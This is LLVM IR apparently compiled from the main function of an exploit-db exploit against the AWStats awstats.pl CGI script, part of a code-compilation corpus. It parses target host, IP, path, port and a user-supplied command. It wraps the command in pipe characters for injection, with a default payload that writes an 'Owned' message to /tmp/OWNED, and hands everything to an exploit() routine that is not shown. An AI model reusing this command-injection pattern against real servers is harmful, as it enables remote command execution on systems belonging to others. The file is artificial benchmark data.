; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/cgi/webapps/extr_772.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/cgi/webapps/extr_772.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [10 x i8] c"localhost\00", align 1
@.str.1 = private unnamed_addr constant [10 x i8] c"127.0.0.1\00", align 1
@.str.2 = private unnamed_addr constant [11 x i8] c"awstats.pl\00", align 1
@.str.3 = private unnamed_addr constant [9 x i8] c"/cgi-bin\00", align 1
@__const.main.exeCmd = private unnamed_addr constant [1024 x i8] c"| echo \22You have been Owned, update AWstat or patch\22 > /tmp/OWNED |align 16
@.str.4 = private unnamed_addr constant [15 x i8] c":uh:i:s:p:c:o:\00", align 1
@optarg = external dso_local global i8*, align 8
@.str.5 = private unnamed_addr constant [58 x i8] c"# `-c` argument can't exceed 1024 bytes (command to long)\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c" | %s | \00", align 1
@.str.7 = private unnamed_addr constant [24 x i8] c"# Unknown option `-%c`\0A\00", align 1
@optopt = external dso_local global i32, align 4
@.str.8 = private unnamed_addr constant [45 x i8] c"# Please specify both host `-h` and ip `-i`\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca [1024 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 80, i32* %7, align 4
  store i32 0, i32* %8, align 4
  store i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i8** %9, align 8
  store i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0), i8** %10, align 8
  store i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0), i8** %11, align 8
  store i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0), i8** %12, align 8
  %14 = bitcast [1024 x i8]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %14, i8* align 16 getelementptr inbounds ([1024 x i8], [1024 x i8]* @__const.main.exeCmd, i32 0, i32 0), i64 1024, i1 false)
  br label %15

15:                                               ; preds = %56, %2
  %16 = load i32, i32* %4, align 4
  %17 = load i8**, i8*** %5, align 8
  %18 = call i32 @getopt(i32 %16, i8** %17, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.4, i64 0, i64 0))
  store i32 %18, i32* %6, align 4
  %19 = icmp ne i32 %18, -1
  br i1 %19, label %20, label %57

20:                                               ; preds = %15
  %21 = load i32, i32* %6, align 4
  switch i32 %21, label %56 [
    i32 104, label %22
    i32 105, label %26
    i32 115, label %30
    i32 112, label %32
    i32 99, label %34
    i32 111, label %45
    i32 117, label %48
    i32 63, label %53
  ]

22:                                               ; preds = %20
  %23 = load i8*, i8** @optarg, align 8
  store i8* %23, i8** %9, align 8
  %24 = load i32, i32* %8, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %8, align 4
  br label %56

26:                                               ; preds = %20
  %27 = load i8*, i8** @optarg, align 8
  store i8* %27, i8** %10, align 8
  %28 = load i32, i32* %8, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %8, align 4
  br label %56

30:                                               ; preds = %20
  %31 = load i8*, i8** @optarg, align 8
  store i8* %31, i8** %11, align 8
  br label %56

32:                                               ; preds = %20
  %33 = load i8*, i8** @optarg, align 8
  store i8* %33, i8** %12, align 8
  br label %56

34:                                               ; preds = %20
  %35 = load i8*, i8** @optarg, align 8
  %36 = call i32 @strlen(i8* %35)
  %37 = icmp sgt i32 %36, 1018
  br i1 %37, label %38, label %41

38:                                               ; preds = %34
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.5, i64 0, i64 0))
  %40 = call i32 @exit(i32 0) #4
  unreachable

41:                                               ; preds = %34
  %42 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %43 = load i8*, i8** @optarg, align 8
  %44 = call i32 @sprintf(i8* %42, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0), i8* %43)
  br label %56

45:                                               ; preds = %20
  %46 = load i8*, i8** @optarg, align 8
  %47 = call i32 @atoi(i8* %46)
  store i32 %47, i32* %7, align 4
  br label %56

48:                                               ; preds = %20
  %49 = load i8**, i8*** %5, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 0
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 @usage(i8* %51)
  br label %56

53:                                               ; preds = %20
  %54 = load i32, i32* @optopt, align 4
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.7, i64 0, i64 0), i32 %54)
  br label %56

56:                                               ; preds = %20, %53, %48, %45, %41, %32, %30, %26, %22
  br label %15

57:                                               ; preds = %15
  %58 = load i32, i32* %8, align 4
  %59 = icmp eq i32 %58, 1
  br i1 %59, label %60, label %63

60:                                               ; preds = %57
  %61 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.8, i64 0, i64 0))
  %62 = call i32 @exit(i32 0) #4
  unreachable

63:                                               ; preds = %57
  %64 = load i8*, i8** %9, align 8
  %65 = load i8*, i8** %12, align 8
  %66 = load i8*, i8** %11, align 8
  %67 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %68 = load i8*, i8** %10, align 8
  %69 = load i32, i32* %7, align 4
  %70 = call i32 @exploit(i8* %64, i8* %65, i8* %66, i8* %67, i8* %68, i32 %69)
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @sprintf(i8*, i8*, i8*) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @usage(i8*) #2

declare dso_local i32 @exploit(i8*, i8*, i8*, i8*, i8*, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
